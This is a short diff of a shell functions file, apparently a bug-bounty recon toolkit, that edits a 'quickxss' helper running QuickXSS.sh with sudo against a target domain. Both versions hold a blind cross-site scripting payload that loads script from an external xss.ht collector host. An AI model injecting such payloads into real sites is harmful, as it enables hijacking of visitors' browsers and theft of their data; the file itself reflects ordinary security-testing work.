@@ -52,7 +52,7 @@ gdork(){
 
 #QuickXSS - just add target.com and output filename
 quickxss(){
-	sudo bash ~/tools/QuickXSS/QuickXSS.sh -d $1 -b "><script src=https://cryptopekkaa.xss.ht></script> -o 	~/$2
+	sudo bash ~/tools/QuickXSS/QuickXSS.sh -d $1 -b <script src=https://cryptopekkaa.xss.ht></script> -o 	~/$2
 }
 
 #sqlmap - add every thing 
